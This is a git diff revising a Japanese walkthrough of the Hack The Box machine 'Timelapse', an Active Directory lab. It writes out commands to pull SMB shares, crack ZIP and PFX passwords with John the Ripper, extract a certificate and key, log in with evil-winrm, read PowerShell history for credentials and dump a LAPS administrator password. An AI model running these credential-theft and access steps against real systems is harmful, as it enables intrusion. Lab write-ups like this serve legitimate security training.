@@ -37,7 +37,7 @@ Nmapスキャン結果から、以下のポートが開放されていること�
 | 636/tcp | LDAP |  |
 | 3268/tcp | LDAP |  |
 | 3269/tcp | LDAP |  |
-| 5986/tcp | WinRM |  |
+| 5986/tcp | WinRM (HTTPS) |  |
 
 
 ## SMB列挙
@@ -70,8 +70,11 @@ recurse on
 prompt off
 mget *
 ```
+ダウンロードが完了したら、`exit`コマンドで接続を終了します。
 
-`exit`コマンドで接続を終了します。
+```bash
+exit
+```
 
 ![alt text](image-6.png)
 
@@ -81,9 +84,11 @@ SYSVOLフォルダは？他のフォルダは？
 
 ## ZIPファイルのパスワード解析
 
-`Dev`フォルダ配下に`winrm_backup.zip`が見つかります。ZIPファイルを展開してみると、パスワード入力が求められます。
+ダウンロードした`Dev`フォルダの中身を見ると、`winrm_backup.zip`が見つかります。このZIPファイルの展開を試みると、パスワード入力が求められます。
 
 ![alt text](image-2.png)
+
+ZIPファイルのパスワードを明らかにします。
 
 まずは、`zip2john`でパスワードハッシュを抽出します。
 
@@ -91,20 +96,22 @@ SYSVOLフォルダは？他のフォルダは？
 zip2john htb/timelapse/Dev/winrm_backup.zip > htb/timelapse/winrm_backup.hash
 ```
 
-`John`でパスワードを解析します。ワードリストに`rockyou.txt`を使用します。
+`John`でパスワードを解析します。ここで、ワードリストに`rockyou.txt`を使用します。
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt htb/timelapse/winrm_backup.hash
 ```
-パスワードは`supremelegacy`であることがわかりました。
+実行結果より、パスワードは`supremelegacy`であることがわかります。
 
 ![img](john.png)
 
 
 ## PFXファイルのパスワード解析
 
-`winrm_backup.zip`を展開すると、PFXファイルが見つかり、パスワードで保護されています。
+入手したパスワード`supremelegacy`で`winrm_backup.zip`を展開します。
+PFXファイルが見つかりますが、これもまたパスワードで保護されています。
 
+先ほどと同じ要領で、PFXファイルのパスワードを明らかにします。
 
 `pfx2john`でパスワードハッシュを抽出します。
 
@@ -125,9 +132,17 @@ john --wordlist=/usr/share/wordlists/rockyou.txt htb/timelapse/legacyy_dev_auth.
 
 ## 秘密鍵・公開鍵の抽出
 
+PFXファイルから秘密鍵と公開鍵を抽出します。
+
+- 秘密鍵の抽出
+
+
 ```bash
 openssl pkcs12 -in htb/timelapse/legacyy_dev_auth.pfx -nocerts -out htb/timelapse/legacyy_dev_auth.key
 ```
+
+- 公開鍵の抽出
+
 
 ```bash
 openssl pkcs12 -in htb/timelapse/legacyy_dev_auth.pfx -nokeys -out htb/timelapse/legacyy_dev_auth.cert
@@ -137,11 +152,16 @@ openssl pkcs12 -in htb/timelapse/legacyy_dev_auth.pfx -nokeys -out htb/timelapse
 key certでいいのか
 -->
 
-## WinRM経由での接続
+## WinRM経由での接続 (legaccy)
+
+抽出した秘密鍵と公開鍵を使って、WinRM経由でマシンに接続します。
 
 ```bash
 evil-winrm -c htb/timelapse/legacyy_dev_auth.cert -k htb/timelapse/legacyy_dev_auth.key -i <RHOST> -S
 ```
+
+接続は成功しました。`whoami`コマンドを実行すると、`legaccy`ユーザーとしてログオンできていることがわかります。
+
 ![img](evil-winrm.png)
 
 ## userフラグの取得
@@ -156,7 +176,9 @@ evil-winrm -c htb/timelapse/legacyy_dev_auth.cert -k htb/timelapse/legacyy_dev_a
 type Desktop/user.txt
 ```
 
-## svc_deploy
+## PowerShellコマンド履歴の閲覧
+
+PowerShellのコマンド履歴を表示します。
 
 ```bash
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -184,7 +206,7 @@ exit
 
 ![img](ConsoleHost_history.png)
 
-## WinRM経由での接続
+## WinRM経由での接続 (svc_deploy)
 
 
 ```bash
@@ -194,7 +216,11 @@ evil-winrm -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i <RHOST> -S
 
 ## ReadLAPSPassword
 
-`svc_deploy`が所属するグループを表示してみます。
+`whoami`コマンドで、`svc_deploy`が所属するグループを表示してみます。
+
+```bash
+whoami /groups
+```
 
 ![alt text](image-5.png)
 
@@ -202,25 +228,35 @@ evil-winrm -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i <RHOST> -S
 
 このグループ名から、LAPSパスワードを閲覧できることが推測できます。
 
+
+LAPSパスワードは、`ms-mcs-admpwd`に格納されているため、`Get-ADComputer`コマンドレットで表示します。
+
 ```bash
 Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
 ```
-
 参考：[ReadLAPSPassword | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword)
 
-パスワードが`Gp&/n0ibz2JRQ4{GSTJ);P;0`であることがわかります。
+実行結果より、パスワードが`Gp&/n0ibz2JRQ4{GSTJ);P;0`であることがわかります。
 
 
-## WinRM経由での接続
+## WinRM経由での接続 (administrator)
+
+入手したパスワードを使い、`administrator`ユーザーとしてマシンに接続してみます。
 
 ```bash
 evil-winrm -u administrator -p 'Gp&/n0ibz2JRQ4{GSTJ);P;0' -i <RHOST> -S
 ```
+見事、管理者権限でマシンに接続することができました。
 
 ![img](evil-winrm2.png)
 
 
-
 ## rootフラグの取得
 
-<!-- rootフラグ画像>
+`TRX`ユーザーの`Desktop`配下にrootフラグが見つかります。
+
+<!-- rootフラグ画像-->
+
+## 関連ページ
+
+今回のWriteupで使用したペネトレツールなど、関連ページを紹介します。
